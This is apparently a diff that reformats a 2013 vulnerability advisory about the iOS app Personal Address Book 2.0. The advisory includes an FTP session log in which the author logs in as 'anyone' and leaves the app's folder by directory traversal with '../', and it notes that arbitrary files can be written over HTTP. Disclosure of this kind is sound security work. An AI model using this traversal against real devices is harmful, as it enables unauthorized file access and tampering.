@@ -1,38 +1,44 @@
-                                Advisory #: 90
-Title: Unauthenticated Remote File Upload via HTTP for Personal Address Book
-2.0 on iOS
-Author:Larry W. Cashdollar, @_larry0
-Date: 2013-08-01
-Download Site: https://itunes.apple.com/us/app/personal-address-book-helpful/
-id490328390?mt=8_http://www.tayutec.com/indexen.html
-Vendor:XiaoWen Huang
-Vendor Notified: 2013-08-01
-Vendor Contact: https://twitter.com/tayutec
-Description: To create colorful dial keyboard- each dial button to display
-different colors ! You can rotate or scale or move picture when you edit
-background image , you can set the picture fuzzy, long press(2 seconds) to
-change back image to the window size , try quickly! You can set different
-colors for different groups! You can set friend's head image by click the
-friend head in the friend table! You can organise your contacts , support the
-same name ,no name , no number , no e-mail.
-Vulnerability:
-larry$ ftp 192.168.0.31 10000 Connected to 192.168.0.31. 220 iosFtp server
-ready. Name (192.168.0.31:larry): anyone 331 Password required for anyone
-Password: 230 User anyone logged in. Remote system type is UNIX. Using binary
-mode to transfer files. ftp> pwd Remote directory: /private/var/mobile/
-Applications/C6EA44B6-1285-4C94-B0E0-348309B7322B/Documents/ftp * ftp> cd
-../../../../ 250 CWD command successful. ftp> pwd Remote directory: /private/
-var/mobile ftp> cd / 250 CWD command successful. ftp> pwd Remote directory: /
-ftp> * You also get path disclosure. http server listening on port 8080 allows
-arbitrary file writes to storage. You can create directories out side the
-upload path through the file upload web interface and the .. bug. Because the
-application is sandbox I was unable to overwtite application executables and
-components so impact is limited. As stated above you can serve malicious
-content (javascript/html) via http.
-CVE-
-JSON:Export
-Exploit Code:
-   1.  
-Screen Shots: [webint.gif]
-Advisory: http://www.vapid.dhs.org/advisories/personal-address-book-
-XiaoWen.html
+
+                               Advisory #: 90
+
+   Title: Unauthenticated Remote File Upload via HTTP for Personal Address
+   Book 2.0 on iOS
+   Author: Larry W. Cashdollar, @_larry0
+   Date: 2013-08-01
+   Download Site:
+   https://itunes.apple.com/us/app/personal-address-book-helpful/id4903283
+   90?mt=8 http://www.tayutec.com/indexen.html
+   Vendor: XiaoWen Huang
+   Vendor Notified: 2013-08-01
+   Vendor Contact: https://twitter.com/tayutec
+   Description: To create colorful dial keyboard- each dial button to
+   display different colors ! You can rotate or scale or move picture when
+   you edit background image , you can set the picture fuzzy, long press(2
+   seconds) to change back image to the window size , try quickly! You can
+   set different colors for different groups! You can set friend's head
+   image by click the friend head in the friend table! You can organise
+   your contacts , support the same name ,no name , no number , no e-mail.
+   Vulnerability:
+   larry$ ftp 192.168.0.31 10000 Connected to 192.168.0.31. 220 iosFtp
+   server ready. Name (192.168.0.31:larry): anyone 331 Password required
+   for anyone Password: 230 User anyone logged in. Remote system type is
+   UNIX. Using binary mode to transfer files. ftp> pwd Remote directory:
+   /private/var/mobile/Applications/C6EA44B6-1285-4C94-B0E0-348309B7322B/D
+   ocuments/ftp * ftp> cd ../../../../ 250 CWD command successful. ftp>
+   pwd Remote directory: /private/var/mobile ftp> cd / 250 CWD command
+   successful. ftp> pwd Remote directory: / ftp> * You also get path
+   disclosure. http server listening on port 8080 allows arbitrary file
+   writes to storage. You can create directories out side the upload path
+   through the file upload web interface and the .. bug. Because the
+   application is sandbox I was unable to overwtite application
+   executables and components so impact is limited. As stated above you
+   can serve malicious content (javascript/html) via http.
+   CVE-
+   JSON: Export
+   Exploit Code:
+
+    1.
+
+   Screen Shots: [webint.gif]
+   Advisory:
+   http://www.vapid.dhs.org/advisories/personal-address-book-XiaoWen.html
